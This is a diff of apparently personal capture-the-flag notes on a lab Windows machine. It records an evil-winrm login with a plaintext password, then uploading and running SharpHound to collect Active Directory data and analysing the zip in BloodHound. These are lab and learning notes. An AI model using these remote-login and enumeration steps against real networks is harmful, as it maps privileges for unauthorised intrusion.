@@ -83,6 +83,15 @@ evil-winrm -i 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful'
 #Download Sharphound.exe and save it in attack machine home
 #upload Sharphound on taget 
 upload /home/kali/SharpHound.exe #run this on target machine shell 
-#run bloodhound from host machine pending check run from already download file or compile it(Just for refrence not actual note)
+.\SharpHound.exe -C all #run this one target to get the details about what previlagge user support have in system
+                        #it will create zip file 20250617085423_BloodHound.zip
+#download  20250617085423_BloodHound.zip in kali machine 
+#run following command in target machine
+download 20250617085423_BloodHound.zip
 
+#in kali open bloodhound 
+#if not installed install bloodhound and complete the set up (refer kali.org)
 
+#upload 20250617085423_BloodHound.zip
+#then anylize the data
+#got DC.SUPPORT.HTB in bloodhound (analize further)
